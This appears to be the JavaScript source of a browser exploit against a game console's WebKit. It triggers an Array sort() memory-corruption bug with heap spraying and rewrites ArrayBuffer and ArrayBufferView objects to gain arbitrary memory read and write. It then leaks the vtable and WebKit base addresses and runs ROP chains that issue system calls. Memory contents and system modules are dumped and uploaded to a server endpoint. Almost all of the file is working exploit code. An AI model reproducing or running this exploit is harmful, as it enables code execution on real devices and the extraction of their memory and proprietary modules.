var start_offset, offset, offset2, index, pid;
var heart, filler, arrays, cbuf, rop_buf;
var maxLenHeart, maxLenFiller;
var sce_buffer_address, sce_uint32_pointer_address, sce_vtable_address, sce_webkit_address;

var o = {};

maxLenHeart = 0x3000;
maxLenFiller = 0x800;

_dview = null;

function runPOC(action, justPOC, displayPageInfo)
{
	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: I - Setting Up .sort() Bug";

	var spray = new Array(0x1000)
	for(var i = 0; i < spray.length;i++)
	{
	  spray[i] = new Uint32Array(0x1A7)
	}

	heart = Array.prototype.constructor.apply(null, new Array(maxLenHeart));
	filler = new Array(maxLenFiller);
	arrays = new Array(0x4);

	o.toString = function() {
	  heart.push(0x3039);

	  for(var i = 0; i < arrays.length; ++i)
	  {
	    var a = Array.prototype.constructor.apply(null, filler);
	    a[0] = 0;
	    a[1] = 1;
	    a[2] = 2;
	    arrays[i] = a;
	  }
	};

	heart[0] = o;

	var lenG = u2d(0x80000000, 0x80000000);
	for(var i = 1; i < heart.length; ++i)
	{
	  heart[i] = lenG;
	}

	heart.sort();
	o.toString = function() {};

	var u32buffer = new Array(0x100)
	for(var i = 0; i < 0x100; i++)
	{
	  var v = new Uint32Array(0x13AC)
	  for(var j = 0; j < v.length; j++)
	  {
	    if(j % 2 == 1)
	      v[j] = 0x41414141
	    else
	      v[j] = j;
	  }
	  u32buffer[i] = v
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: II - Finding ArrayBufferView in Memory...";

	arrayBufferView = arrays[1];

	start_offset = 0x2F000;
	offset = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * -40)]).low;
	offset2 = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * 30)]).low;
	index = 0;

	for(var i = 4; i < 100; i++)
	{
		var val = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * i) - offset / 2 - 1]).hi;

		if(val == 0xbadaeef7)
		{
			index = i;
			break;
		}
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: III - Modifying ArrayBufferView Object Size...";

	// Modify ArrayBufferView object size and make the buffer point to the ArrayBuffer field
	arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
	arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 2] = arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 4];

	for(var i = 0; i < u32buffer.length; i++)
	{
		if(u32buffer[i].length != 0x13AC)
	  {
	    // Modify the ArrayBuffer so it is larger and make it so it's m_data pointer points to the ArrayBufferViews
	    sce_buffer_address = new dcodeIO.Long(u32buffer[i][2],u32buffer[i][3],true);
	    sce_uint32_pointer_address = new dcodeIO.Long(u32buffer[i][6],u32buffer[i][7],true);

	    u32buffer[i][4] = (0x60000 * 4);

	    u32buffer[i][2] = sce_uint32_pointer_address.getLowBitsUnsigned();
	    u32buffer[i][3] = sce_uint32_pointer_address.getHighBitsUnsigned();

	    break;
	  }
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: IV - Finding Modified ArrayBuffer in Memory...";

	// Find our new ArrayBuffer and create a uint32 array from it
	for(var i = 0; i < u32buffer[i].length; i++)
	{
		if(u32buffer[i].buffer.byteLength != 0x4eb0)
		{
			cbuf = new Uint32Array(u32buffer[i].buffer);
			break;
		}
	}

	sce_vtable_address = new dcodeIO.Long(cbuf[0], cbuf[1], true);
	sce_webkit_address = sce_vtable_address.sub(0x2600d80);

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: V - Starting ROP and finding modules...";

	if(justPOC)
	{
		document.getElementById("vtableAddress").innerHTML = "VTable Address: 0x" + sce_vtable_address.toString(16);
		document.getElementById("webkitAddress").innerHTML = "WebKit Module Base Address: 0x" + sce_webkit_address.toString(16);
		document.getElementById("bufferAddress").innerHTML = "Buffer Base Address: 0x" + sce_buffer_address.toString(16);
		document.getElementById("uint32Address").innerHTML = "Unsigned Int32 Address: 0x" + sce_uint32_pointer_address.toString(16);
	}
	else if(displayPageInfo)
	{
		document.getElementById("fwversion").innerHTML = "<strong>Firmware Version: </strong>" + ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
		document.getElementById("webkitver").innerHTML = "<strong>WebKit Version: </strong>" + ua.substring(ua.indexOf("AppleWebKit/") + 12, ua.indexOf("(KHTML"));

		document.getElementById("vtableAddress").innerHTML = "<strong>VTable Address:</strong> 0x" + sce_vtable_address.toString(16);
		document.getElementById("webkitAddress").innerHTML = "<strong>WebKit Module Base Address:</strong> 0x" + sce_webkit_address.toString(16);
		document.getElementById("bufferAddress").innerHTML = "<strong>Buffer Base Address:</strong> 0x" + sce_buffer_address.toString(16);
		document.getElementById("uint32Address").innerHTML = "<strong>Unsigned Int32 Address:</strong> 0x" + sce_uint32_pointer_address.toString(16);

		alert(
			"We've found some basic information about your system:"  + "\r\n" +
			"Firmware Version: " + ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")) + "\r\n" +
			"WebKit Version: " + ua.substring(ua.indexOf("AppleWebKit/") + 12, ua.indexOf("(KHTML"))
		);
	}

	alert(
		"We've found in-depth information about your system through the exploit:" + "\r\n" +
		"vTable Address: 0x" + sce_vtable_address.toString(16) + "\r\n" +
		"WebKit Address: 0x" + sce_webkit_address.toString(16) + "\r\n" +
		"Buffer Address: 0x" + sce_buffer_address.toString(16) + "\r\n" +
		"UINT32 Address: 0x" + sce_uint32_pointer_address.toString(16)
	);

	// Unless we're getting modules / doing anything we need ROP for, stop here for POC

	if(action == "get_modules" || action == "get_pid" || action == "get_modules_pid" || action == "dump_module" || action == "dump_memory")
	{
		cbuf[0x1e] = 0x60000;

		rop_buf = undefined;

		for(var i = 0; i < u32buffer[i].length; i++)
		{
			if(u32buffer[i].length == 0x60000)
		  {
		    rop_buf = u32buffer[i]
		    break;
		  }
		}

		for(var i = 0; i < 0x13AC;i++)
		{
		  rop_buf[i] = 0;
		}

		var initial_stack_ptr = 0x1000 - (get_buf_addr().getLowBitsUnsigned() % 0x1000);
		var stack_ptr = initial_stack_ptr;

		if(displayPageInfo)
			document.getElementById("modulesInfo").innerHTML = ""; // First clear it as it will have "NOT FOUND"

		if(action == "get_modules" || action == "get_modules_pid")
		{
			for(var i = 0x0; i < 0x100; i++)
			{
				/* Start of system call */

			  var ret_addr;
			  var info_addr;

			  // Stack Allocation
			  var old_ptr = stack_ptr;
			  if (old_ptr % 4 != 0) {
			    old_ptr += 4 - (old_ptr % 4);
			  }

			  stack_ptr = old_ptr + 4;
			  ret_addr = get_buf_addr().add(old_ptr);

			  // Stack memory alignment
			  old_ptr = stack_ptr;
			  if (old_ptr % 0x1000 != 0) {
			    old_ptr += 0x1000 - (old_ptr % 0x1000);
			  }
			  stack_ptr = old_ptr + 0x1a8;
			  info_addr = get_buf_addr().add(old_ptr);

			  write32(info_addr, 0x1a8)

				// ROP

			  var r = new RopChain();

			  r.syscall(608, i, 0, info_addr)
			  r.add('pop rdi')

			  r.add(ret_addr)
			  r.add('mov qword ptr [rdi], rax')

			  r.execute();

			  var ret = read32(ret_addr);
			  var info = read_data8(info_addr, 0x1a8);

			  stack_ptr = initial_stack_ptr;

				/* End of system call */

				if(ret != 0)
					continue;

				var type = undefined;

				if(read_str8(info, 0x8).indexOf("sprx") !== -1)
					type = "SPRX";
				else
					type = "SELF";

				var base_one = new Uint32Array(info.buffer, 0x110, 2);
				var base_two = new Uint32Array(info.buffer, 0x148, 2);
				var base_thr = new Uint32Array(info.buffer, 0x150, 2);

				var displayBaseOne = new dcodeIO.Long(base_one[0], base_one[1], true).toString(16).toString(16);
				var displayBaseTwo = new dcodeIO.Long(base_two[0], base_two[1], true).toString(16).toString(16);
				var displayBaseThr = new dcodeIO.Long(base_thr[0], base_thr[1], true).toString(16).toString(16);

				// These are annoying
				/*alert(
					"We've found a module:" + "\r\n" +
					"Module ID: 0x" + i.toString(16) + "\r\n" +
					"Module Name: " + read_str8(info, 0x8) + "\r\n" +
					"Module Type: " + type + "\r\n" +
					"Module Base Address 1: 0x" + displayBaseOne + "\r\n" +
					"Module Base Address 2: 0x" + displayBaseTwo + "\r\n" +
					"Module Base Address 3: 0x" + displayBaseThr + "\r\n"
				);*/

				if(displayPageInfo)
					document.getElementById("modulesInfo").innerHTML += "<b>Module: " + read_str8(info, 0x8) + "</b><br />&nbsp;&nbsp;&nbsp;" + "ID: 0x" + i.toString(16) + "<br />&nbsp;&nbsp;&nbsp;" + "Type: " + type + "<br />&nbsp;&nbsp;&nbsp;" + "Module Base Address One: 0x" + displayBaseOne + "<br />&nbsp;&nbsp;&nbsp;Module Base Address Two: 0x" + displayBaseTwo + "<br />&nbsp;&nbsp;&nbsp;Module Base Address Three: 0x" + displayBaseThr + "<br />==<br />"
			}
			alert("We found modules!");
		}

		if(action == "get_pid" || action == "get_modules_pid")
		{
			/* Start system call */
			var ret_addr;
			var info_addr;

			// Stack Allocation
			var old_ptr = stack_ptr;
			if (old_ptr % 4 != 0) {
				old_ptr += 4 - (old_ptr % 4);
			}

			stack_ptr = old_ptr + 4;
			ret_addr = get_buf_addr().add(old_ptr);

			// Stack memory alignment
			old_ptr = stack_ptr;
			if (old_ptr % 0x1000 != 0) {
				old_ptr += 0x1000 - (old_ptr % 0x1000);
			}
			stack_ptr = old_ptr + 0x1a8;
			info_addr = get_buf_addr().add(old_ptr);

			var r = new RopChain();

			// ROP

			r.syscall(20)
			r.add('pop rdi')

			r.add(ret_addr)
			r.add('mov qword ptr [rdi], rax')

			r.execute();

			/* End of system call */

			var ret = read32(ret_addr);

			stack_ptr = initial_stack_ptr;

			alert("We've found the WebKit PID: " + ret);

			pid = ret;
		}

		if(action == "dump_memory")
		{
			/* Start Dump */

			var moduleAddress = get_buf_addr().add(parseInt(document.getElementById("dumpAddr").value, 16));
			var moduleBuffer = read_data8(moduleAddress, parseInt(document.getElementById("dumpSize").value));

			alert("Dumping memory at location 0x" + document.getElementById("dumpAddr").value + " with size of " + parseInt(document.getElementById("dumpSize").value) + " bytes...");

			$.ajax({
				url: 'api/dumpFileMem.php',
				type: 'POST',
				contentType: 'application/octet-stream',
				data: moduleBuffer,
				processData: false,
				async: false
			});

			alert("Memory has been successfully dumped to /dumps/memory.bin!");

			/* End Dump, reset stack */

			stack_ptr = initial_stack_ptr;
		}

		if(action == "dump_module")
		{
			/* Start of system call */

			var ret_addr;
			var info_addr;

			// Stack Allocation
			var old_ptr = stack_ptr;
			if (old_ptr % 4 != 0) {
				old_ptr += 4 - (old_ptr % 4);
			}

			stack_ptr = old_ptr + 4;
			ret_addr = get_buf_addr().add(old_ptr);

			// Stack memory alignment
			old_ptr = stack_ptr;
			if (old_ptr % 0x1000 != 0) {
				old_ptr += 0x1000 - (old_ptr % 0x1000);
			}
			stack_ptr = old_ptr + 0x1a8;
			info_addr = get_buf_addr().add(old_ptr);

			write32(info_addr, 0x1a8)

			// We need to get the proper module ID for what module we want to load
			var fileName = document.getElementById("moduleToDump").innerHTML;
			var moduleId = undefined;
			var moduleSize = undefined;

			if(fileName.indexOf("libSceWebKit2") !== -1)
			{
				moduleId = 0x24;
				moduleSize = 0x90000;
			}
			else if(fileName.indexOf("libSceSystemService") !== -1)
			{
				moduleId = 0x26;
				moduleSize = 0x5000;
			}
			else if(fileName.indexOf("libSceSysmodule") !== -1)
			{
				moduleId = 0xc;
				moduleSize = 0x4000;
			}
			else if(fileName.indexOf("libSceSysCore") !== -1)
			{
				moduleId = 0x25;
				moduleSize = 0x26A2;
			}
			else if(fileName.indexOf("libSceSsl") !== -1)
			{
				moduleId = 0x35;
				moduleSize = 0x12000;
			}
			else if(fileName.indexOf("libSceRtc") !== -1)
			{
				moduleId = 0x20;
				moduleSize = 0x1000;
			}
			else if(fileName.indexOf("libSceRegMgr") !== -1)
			{
				moduleId = 0x1f;
				moduleSize = 0x1000;
			}
			else if(fileName.indexOf("libScePad") !== -1)
			{
				moduleId = 0x21;
				moduleSize = 0x2000;
			}
			else if(fileName.indexOf("libSceOrbisCompat") !== -1)
			{
				moduleId = 0x23;
				moduleSize = 0x57000;
			}
			else if(fileName.indexOf("libSceNetCtl") !== -1)
			{
				moduleId = 0x1b;
				moduleSize = 0x2000;
			}
			/*else if(fileName.indexOf("libSceNet") !== -1) // This seems to crash webkit, disable button for now
			{
				moduleId = 0xe;
				moduleSize = 0x5000;
			}*/
			else if(fileName.indexOf("libSceMbus") !== -1)
			{
				moduleId = 0x1e;
				moduleSize = 0x2000;
			}
			/*else if(fileName.indexOf("libSceLibcInternal") !== -1)  // This seems to crash webkit, disable button for now
			{
				moduleId = 0x2;
				moduleSize = 0x34000;
			}*/

			// ROP

			var r = new RopChain();

			r.syscall(608, moduleId, 0, info_addr)
			r.add('pop rdi')

			r.add(ret_addr)
			r.add('mov qword ptr [rdi], rax')

			r.execute();

			var ret = read32(ret_addr);
			var info = read_data8(info_addr, 0x1a8);

			stack_ptr = initial_stack_ptr;

			/* End of system call */

			if(ret != 0)
				alert("Failed to get module info!!!");

			var base_one = new Uint32Array(info.buffer, 0x110, 2);

			var displayBaseOne = new dcodeIO.Long(base_one[0], base_one[1], true).toString(16);

			alert(
				"We've found the module:" + "\r\n" +
				"Module ID: 0x" + moduleId.toString(16) + "\r\n" +
				"Module Name: " + read_str8(info, 0x8) + "\r\n" +
				"Module Base Address: 0x" + displayBaseOne + "\r\n"
			);

			cbuf[0x1e] = moduleSize;

			/*
				If we're dumping libSceWebKit2.bin, the module is so large we need to dump it in chunks.
				So we need to check what chunk we're dumping and multiply it by 0x90000 for setting the buffer Address
			*/

			if(fileName.indexOf("libSceWebKit2"))
			{
				moduleChunkIndex = parseInt(fileName.substring(fileName.indexOf("WebKit2") + 9, fileName.indexOf(".bin")))
				set_buf_addr(new dcodeIO.Long(base_one[0], base_one[1], true).add(0x90000 * (moduleChunkIndex - 1)));
			}
			else
			{
				set_buf_addr(new dcodeIO.Long(base_one[0], base_one[1], true));
			}

			var moduleBuffer = rop_buf;

			$.ajax({
				url: 'api/dumpFileModule.php?var=' + fileName.substring(27, fileName.indexOf(".bin")) + '.bin',
				type: 'POST',
				contentType: 'application/octet-stream',
				data: moduleBuffer,
				processData: false,
				async: false
			});

			alert("The module has been successfully dumped as '" + fileName.substring(27, fileName.indexOf(".bin")) + ".bin', located in /dumps.")
			/* End Dump, reset stack */

			stack_ptr = initial_stack_ptr;
		}
	}

	if(justPOC)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Finished!";
	else if(action == "get_pid" || action == "get_modules_pid")
		document.getElementById("webkitpid").innerHTML = "<strong>WebKit Process ID: </strong>" + pid;

	pocStarted = true;
}
